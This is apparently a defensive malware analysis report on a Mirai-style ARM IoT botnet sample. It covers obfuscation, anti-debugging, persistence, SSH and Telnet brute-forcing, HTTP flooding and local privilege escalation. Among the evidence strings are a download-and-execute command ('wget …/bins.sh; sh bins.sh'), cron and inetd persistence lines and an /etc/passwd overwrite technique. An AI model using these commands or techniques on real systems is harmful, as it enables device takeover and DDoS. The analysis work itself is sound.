> **Verdict: malicious** · Family **Mirai** (doubtful) · Confidence **medium**
> 
> Aliases: Mirai variant (network-dispatch persistence), IoT DDoS botnet
> 
> A 32-bit ARM statically linked PIE with a complete IoT botnet arsenal built in: the MIRAI-style CNC command set (MIRAI-CNC/1.0 / GETLOCALIP / SCANNER ON|OFF / BOTKILLER / HTTPFLOOD), HTTP flood templates, SSH/Telnet weak-credential dictionaries, Noise_IK (25519+ChaCha20-Poly1305) tunnel parameters, persistence script templates for more than a dozen init/watchdog schemes, and two local privilege-escalation implementations — rxrpc/rxkad and espintcp page-cache overwrite. The strings and structures were read directly through local static forensics, and when executed inside a controlled instance it was observed reading /proc/self/status and then terminating itself.

## Behavior analysis

**12** behaviors in total, each backed by evidence; **11** are obtainable statically and **1** was obtained through dynamic analysis.

### 1. XOR-obfuscated built-in strings

`T1027` · Confidence **High** · Static

Many strings in .rodata are stored XORed byte-by-byte with 0x02 (for example 'CRRNKACVKML'->'APPLICATION', 'FGDNCVG'->'DEFLATE') and are decoded at runtime before use, evading static keyword searches.

> **Evidence**: 0x51b7c 'kLVGN' -> 'iNTEL'; 0x51e5a 'w@WLVW' -> 'uBUNTU' (recovered with XOR 0x02)
> 
> **Source**: `ev-000001` · `ev-000019`

### 2. Detect debugging and instrumentation

`T1622` · Confidence **High** · Dynamic

Early in startup it reads /proc/self/status and parses TracerPid, and checks for LD_PRELOAD/LD_AUDIT/LD_PROFILE/LD_DEBUG/R2_DEBUG/R2PIPE_*/VALGRIND_* as well as strace/ltrace/radare2/frida-server process names; in the controlled instance the process was terminated immediately after that read (exit 137) and produced no further behavior.

> **Evidence**: 0x560c0 '/proc/self/status'; 0x560d2 'TracerPid:'; 0x5615b 'strace'; 0x56187 'frida-server'; dyn.trace observed openat('/proc/self/status') then read 'TracerPid:	166' and exited immediately
> 
> **Source**: `ev-000001` · `ev-000019` · `ev-000016` · `ev-000017` · `ev-000018` · `ev-000007`

### 3. Spoof kernel thread process name

`T1036.005` · Confidence **High** · Static

Contains a set of kernel/common service process names ([kworker/N:M], [kworker/u:N], [kthrotld/0], [ext4-rcvy], docker, php-fpm, nginx, rsyslogd, dhcpd) used to rewrite argv/the displayed process name so it blends into the system process list.

> **Evidence**: 0x53fd1 '[kworker/0:0]'; 0x53fdf '[kworker/0:1]'; 0x5405d '[kthrotld/0]'; 0x5408f '[ext4-rcvy]'; 0x5409b 'docker'; 0x540aa 'nginx'
> 
> **Source**: `ev-000001` · `ev-000019`

### 4. Persist through multiple watchdog schemes

`T1543.002` · Confidence **High** · Static

Generates and writes more than 20 kinds of persistence configuration — systemd service/timer/path, systemd generator, cron.d and cron.hourly/daily, SysV init.d and rcS/rc3/rc5, rc.local, profile.d, NetworkManager dispatcher, udev rules, opkg/apt hooks, hotplug, local.d, OpenRC, procd, runit, s6, dinit, Android init, inetd — all using /usr/local/bin/network-dispatch.

> **Evidence**: 0x54370-0x552xx '[Unit] Description=Network Dispatch' / '[Service] ExecStart=%s' / '/etc/systemd/system/network-dispatch.service'; 0x54843 '* * * * * [ -x %s ] || %s'; 0x551ef '48102 stream tcp nowait root %s %s'
> 
> **Source**: `ev-000001` · `ev-000019`

### 5. Drop itself into system directories

`T1036.005` · Confidence **High** · Static

Writes copies of itself to /usr/local/bin/network-dispatch, /usr/bin/.network-dispatch, /system/bin/.netd, and hidden directories such as /var/tmp, /dev/shm, and /tmp/.ICE-unix, and points every autostart entry at that copy.

> **Evidence**: 0x5434f '/usr/local/bin/network-dispatch'; 0x55dce '/system/bin/.netd'; 0x5587f '/var/tmp/.network-dispatch'; 0x55bac '/tmp/.ICE-unix/.nd'
> 
> **Source**: `ev-000001` · `ev-000019`

### 6. Brute-force SSH and Telnet weak credentials

`T1110.001` · Confidence **High** · Static

Contains accounts such as root/admin/ubuntu/oracle/postgres/git/ec2-user/centos/debian/deploy/ansible plus dozens of common password lists, and forges various SSH client banners (OpenSSH 6.6.1~9.3, Dropbear, PuTTY, JSCH, libssh) for lateral brute-forcing against ports 22/23.

> **Evidence**: 0x56669 'password'; 0x56684-0x56829 password and username lists; 0x56846-0x5691d several 'SSH-2.0-*' banners; 0x56b20 'Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s'
> 
> **Source**: `ev-000001` · `ev-000019`

### 7. Accept CNC remote commands

`T1071.001` · Confidence **High** · Static

Implements a Mirai-style C&C protocol: registration with NICK bot-%s / JOIN #%s and reporting with REPORT %s:%s:%s, supports commands such as GETLOCALIP, SCANNER ON/OFF, BOTKILLER, STOMP, HTTPFLOOD, and beacons over HTTP with X-Bot-Id / X-Campaign headers.

> **Evidence**: 0x564d2 'MIRAI-CNC/1.0'; 0x564a6 'GETLOCALIP'; 0x564b1 'SCANNER ON'; 0x564c8 'BOTKILLER'; 0x5631b 'NICK bot-%s'; 0x56200 'X-Campaign: %s'
> 
> **Source**: `ev-000001` · `ev-000019`

### 8. Launch HTTP flood attacks

`T1498.001` · Confidence **High** · Static

Contains several HTTP/1.1 request templates (GET/POST/OPTIONS/CONNECT, forged X-Forwarded-For, Cookie/csrftoken, Sec-Fetch, Chrome 131 UA) and a large set of paths (/search, /login, /api/v1/query, /wp-login.php, /checkout, etc.) for launching layer-7 DDoS on CNC command.

> **Evidence**: the 'GET %s HTTP/1.1' template family starting at 0x364E0; 0x56343 'PRIVMSG #%s :HTTPFLOOD ready'; 0x56464 'HTTPFLOOD'; 0x36EB1 '/wp-login.php'
> 
> **Source**: `ev-000001` · `ev-000019`

### 9. Download and execute a second-stage script

`T1105` · Confidence **High** · Static

Receives the shell command '!* SH cd /tmp; wget hxxp://<host>/bins.sh; sh bins.sh' issued by the CNC, pulls the script from the remote end, and executes it to deliver payloads for other architectures or lateral-movement tools.

> **Evidence**: 0x56474 '!* SH cd /tmp; wget hxxp://%s/bins.sh; sh bins.sh'
> 
> **Source**: `ev-000001` · `ev-000019`

### 10. Local privilege escalation by tampering with credentials

`T1068` · Confidence **High** · Static

Embeds two Linux local privilege-escalation implementations: an rxrpc/rxkad key-forging path, and an espintcp/AF_ALG splice page-cache overwrite (DirtyFrag-like) — it changes the first line of /etc/passwd to root::0:0 and patches the /usr/bin/su page cache, after which passwordless su yields root.

> **Evidence**: 0x5737e '=== rxrpc/rxkad LPE EXPLOIT'; 0x57605 '/etc/passwd already patched (root::0:0'; 0x56d8e 'root::0:0'; 0x5733f '[su] /usr/bin/su page-cache patched'; 0x58aed 'firing espintcp splice...'
> 
> **Source**: `ev-000001` · `ev-000019`

### 11. Noise encrypted tunnel callback

`T1573.002` · Confidence **High** · Static

Implements a Noise_IK(psk2) + Curve25519 + ChaCha20-Poly1305 + BLAKE2s handshake and chacha20-poly1305@openssh[.]com, wrapping CNC/reporting traffic inside an encrypted tunnel to evade traffic inspection.

> **Evidence**: 0x56b20 'Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s'; 0x5662f 'chacha20-poly1305@openssh[.]com'; 0x56601 'curve25519-sha256'
> 
> **Source**: `ev-000001` · `ev-000019` · `ev-000002`

### 12. Scan internal networks and self-propagate

`T1046` · Confidence **Medium** · Static

Driven by the CNC's SCANNER ON/OFF switch, it probes LAN/WAN hosts over Telnet (23), SSH (22), and HTTP, and after a successful brute force it drops itself to keep spreading.

> **Evidence**: 0x564b1 'SCANNER ON'; 0x564bc 'SCANNER OFF'; 0x564c8 'BOTKILLER'; 0x56c08 'connect'
> 
> **Source**: `ev-000001` · `ev-000019`

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; keep this in mind when citing this report.

- Not ransomware/a wiper: no file-encryption key negotiation or mass-destruction logic was found; the write to /etc/passwd is a privilege-escalation technique, not destructive behavior.
- Do not treat every embedded IP as an active C2: the sample contains documentation-reserved addresses such as 192.0.2[.]14, 198.51.100[.]42, 203.0.113[.]77, 192.0.2[.]201, 198.51.100[.]13, which are clearly decoys/placeholders.
- Do not claim that real outbound connections were observed or that CNC commands were received: this execution was network-isolated, and the sample terminated itself after the anti-debug check.
- Do not assert that it belongs to a specific vendor-named variant; the family determination relies only on the 'MIRAI-CNC/1.0' self-identifier and Mirai command-family characteristics.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |

**Limitations and open questions**

1. No real network behavior was observed: the execution environment had no network and no fake-network service, so the C2 hosts, ports, and roles all come from static strings and are marked pending_dynamic_verify.
2. The sample appears to self-terminate on anti-debugging (it read a non-zero TracerPid, exit 137); persistence writes, brute-forcing, and DDoS could not be confirmed dynamically.
3. The local packer/anti-debug identification tool, which is specific to PE files, does not apply to ELF; the packing verdict is based on section-table entropy and string readability.
4. The binary is a stripped static PIE; Ghidra did not resolve a main symbol, so functionality was determined mainly from .rodata strings, missing imports, and startup code structure.
5. Some strings are XOR 0x02 obfuscated, and the decoded results come from a self-written script (self-reported evidence, confidence capped at 0.7).
6. Family attribution (Mirai variant) relies on the sample's self-identifying string and lacks vendor or YARA rule cross-validation.
